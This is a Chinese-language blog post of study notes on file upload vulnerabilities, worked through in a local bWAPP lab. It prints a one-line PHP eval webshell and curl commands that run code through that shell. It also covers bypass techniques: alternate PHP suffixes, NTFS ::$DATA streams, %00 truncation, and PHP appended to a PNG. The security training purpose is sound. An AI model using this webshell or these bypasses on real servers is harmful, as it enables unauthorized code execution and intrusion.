---
title: 《Web攻防安全实战》学习总结：文件上传漏洞
date: 2020-12-05 14:36:21
index_img: /img/websecurity.png
banner_img: /img/websecurity.png
tags:
  - 安全
  - Web安全
categories:
  - Web安全
  - 文件上传漏洞
---
# 文件上传漏洞
## 1、漏洞原理：Webshell
webshell，顾名思义：web指的是在web服务器上，而shell是用脚本语言编写的脚本程序，webshell就是就是web的一个管理工具，可以对web服务器进行操作的权限。
webshell根据脚本可以分为PHP脚本木马，ASP脚本木马，也有基于.NET的脚本木马和JSP脚本木马。
关键函数：以php为例，eval（），执行用户输入的函数。

## 2、一句话木马
### 2.1 php一句话木马
```
<?php @eval($_POST['hacker']);?>
```
获取post请求中hacker字段的值，并将该值转换为php代码执行；

## 3、后缀名绕过
### 3.1 php文件后缀名绕过
apache、nginx等web服务器会加载一些语言解析器模块，如python、php、asp等，当某个特定的文件后缀名被限制上传的时候，我们就可以根据web server的解析原理，修改文件后缀名，达到绕过限制的目的，但不是所有的后缀名都能被web server解析，下面通过实战模拟探究下绕过的原理

## 4、Windows文件流特性绕过
Windows平台使用NTFS文件流，NTFS环境一个文件默认使用的是未命名文件流，同时可创建其他命令的文件流，Windows资源管理器默认不显示出文件的命名文件流。举例：
1）在任一NTFS分区下打开CMD命令提示符，输入echo abcde>>a.txt:b.txt，则在当前目录下会生成一个名为a.txt的文件，但文件的大小为0字节，打开后也无任何内容，只有输入命令：notepad a.txt:b.txt 才能看见写入的abcde
2）在上边的命令中，a.txt可以不存在，也可以是某个已存的文件，文件格式无所谓，无论是.txt还是.jpg|.exe|.asp都行；b.txt也可以任意指定文件名以及后缀名。（可以将任意文本信息隐藏于任意文件中，只要不泄露冒号后的虚拟文件名(即b.txt)，别人是根本不会查看到隐藏信息的）
3）包含隐藏信息的文件仍然可以继续隐藏其它的内容，对比上例，我们仍然可以使用命令echo 12345>>a.txt:c.txt　给a.txt建立新的隐藏信息的流文件，使用命令notepad a.txt:c.txt　打开后会发现12345这段信息，而abcde仍然存在于a.txt:b.txt中丝毫不受影响。
当我们访问a.asp::$DATA 时，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:lake2.asp，请求 a.asp:lake2.asp::$DATA，则是请求a.asp中的流数据lake2.asp的流数据内容。
例如当.php后缀当文件类型被黑名单限制时，可以通过拦截数据包，将文件名修改为shell.php::$DATA当方式进行绕过。

## 5、%00阶段绕过
如果后端在处理上传文件的保存过程，是以路径拼接的方式，且路径是从前端获取，就可以采取路径截断的方式绕过白名单。具体手法是利用burpsuite，在我们想要截断的位置，进入十六进制，添加00截断符号。具体实现见实战模拟。

## 6、文件头检测绕过
每种文件头格式都有对应的十六进制和自负的编码形式。比如png格式的文件头标识符是89 50 4E 47，git格式的文件头标识符是47 49 46 38。在面对具有文件内容检测的上传功能时，我们可以将攻击代码和图片等文件进行聚合，实现既满足文件头检测，又可成功执行代码的效果。

## 7、文件上传源码审计
逻辑代码安全性&调用函数安全性

## 8、Fuzz
burpsuite —— send to intruder 
需要准备字典 

# 实战模拟
## 环境搭建
```
# 第一次启动
docker pull registry.cn-shanghai.aliyuncs.com/yhskc/bwapp
docker run -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com/yhskc/bwapp

# 根据课程中的演示搭建好 bWAPP 实验环境后，以后再启动 bWAPP
docker container list -a # 查看 container id
docker start xxx # xxx 就是上一步获得的 container id，运行完这条命令后，访问响应的网址即可
```

## 一句话木马上传
初始化bwapp，过程省略，选择文件上传漏洞 Unrestricted File Upload，按下图操作，上传一句话木马文件，并复制上传后服务器返回的文件保存地址
![fileupload](/img/fileupload1.gif)
构造一句话木马，在POST请求的hacker字段中写入我们希望服务器执行的代码，利用curl工具构造post请求：
```
curl -d "hacker=echo get_current_user();" http://127.0.0.1:8888/images/shell.php
curl -d "hacker=echo getcwd();" http://127.0.0.1:8888/images/shell.php
```
此处介绍两个php api
get_current_user()：获取服务所属用户名
getcwd()：获取当前执行目录
操作见下图，服务器成功返回了用户名www-data及当前执行目录/app/images

![fileupload](/img/fileupload2.gif)


## 文件名后缀绕过
将文件上传等级设置为 medium，上传文件后缀为php时，显示被拦截，如下：
![fileupload](/img/hz.gif)
将shell.php文件后缀修改为php3和php30，上传php3后缀文件时，可成功绕过后缀名限制
![fileupload](/img/hz3.png)
上传shell.php30文件，服务器将文件当作txt文本进行了处理，直接打印了文件内容
![fileupload](/img/hz.png)
通过web server的配置文件，探究文件名绕过的原理；bwapp使用的web server是apache，通过配置文件可以了解到apache的语言解析模块文件路径

```
vim /etc/apache2/apache2.conf
```
![fileupload](/img/apcf.png)
进入对应的语言解析模块配置文件：

```
vim /etc/apache2/mods-enabled/php5.conf
```

![fileupload](/img/phpconf.png)
通过配置文件可发现，php、php3、php5、phptml等文件后缀都可以被apache服务器解析，这也就是为什么刚刚上传的php3文件可被执行，php30不能被执行的原因。了解了文件名后缀的绕过原理，我们就可以通过上传不同的后缀名文件来达到文件后缀名限制绕过的目的。

## %00截断绕过
首先上传shell.php.jpg，文件可成功上传。
![fileupload](/img/jieduan2.png)
![fileupload](/img/jieduan1.png)
由于这个上传点的文件路径和文件名可控，因此考虑在php后进行截断，实现我们要上传的文件类型，同时满足文件类型校验。
首先利用burpsuite拦截上传请求，利用16进制输入文件截断符 00，因为键盘输入不了这个符号；同时便于查找位置，我们输入 空格（16进制数是20），便于查找需要修改的位置。将 空格20 修改为 00进行截断。可发现空格消失，同时在png后面移动光标时会发现存在一个隐藏字符，即需要移动两次才到达 .jpg 位置。
![fileupload](/img/jieduan3.png)
![fileupload](/img/jieduan4.png)
![fileupload](/img/jieduan5.png)
![fileupload](/img/jieduan6.png)
取消burpsuite拦截，文件成功上传，点击here查看，文件名被成功截断且修改为shell.png
![fileupload](/img/jieduan7.png)

## 文件头检测绕过
以php语言为例，首先准备一个普通的png格式文件，查看文件内容，文件头标志符号是完整的：
![fileupload](/img/filehead.png)
再准备一个用于测试的php文件，功能是输出‘test’字符串：
![fileupload](/img/filehead2.png)
将php文件内容追加到png文件内：
```
cat test.php >> filetype.png
```
![fileupload](/img/filehead3.png)
利用php，解析png文件，php代码被成功执行，说明我们可以通过把图片和代码进行聚合的方式，让它既满足文件头的标准校验，又满足代码的执行。
![fileupload](/img/filehead4.png)
